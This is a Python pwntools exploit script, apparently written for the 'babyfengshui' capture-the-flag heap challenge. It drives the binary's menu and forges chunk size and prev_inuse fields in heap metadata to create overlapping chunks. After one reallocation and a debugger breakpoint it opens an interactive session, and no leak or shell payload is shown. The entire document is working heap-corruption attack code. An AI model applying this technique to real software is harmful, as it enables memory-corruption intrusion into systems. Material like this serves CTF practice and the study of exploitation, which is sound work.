from pwn import *
context.binary = "./babyfengshui"
context.log_level = 'debug'
elf = context.binary

def dbg():
	gdb.attach(p, 'b* 0x08048A68')
	raw_input()

def menu(ch):
	p.sendlineafter('Action: ', str(ch))

def add(size, name, content):
	menu(0)
	p.sendlineafter('description: ', str(size))
	p.sendlineafter('name: ', name)
	p.sendlineafter('length: ', str(size))
	p.sendlineafter('text: ', content)
	print "add chunk!"

def free(idx):
	menu(1)
	p.sendlineafter('index: ', str(idx))

def show(idx):
	menu(2)
	p.sendlineafter('index: ', str(idx))	

def edit(idx, content):
	menu(3)
	size = len(content)
	p.sendlineafter('index: ', str(idx))
	p.sendlineafter('length: ', str(size))
	p.sendlineafter('text: ', content)

def exploit():
	add(0x18, 'tree', '0'*0x18)
	add(0x48, 'tree', '1'*0x48)
	add(0x18, 'tree', '2'*0x18)
	add(0x18, 'tree', '3'*0x18)

	#fake chunk1' size and chunk2' prev_inuse
	#0x88 + 0x20 + 0x88  = 0x130
	edit(0, '0'*0x14 + p32(0x131))
	edit(2, '0'*0x14 + p32(0x130))

	dbg()
	free(1)								#overlapping 2
	add(0x80, 'tree', '0'*4)

	p.interactive()
	p.close()



if __name__ == '__main__':
	p = process('./babyfengshui')
	exploit()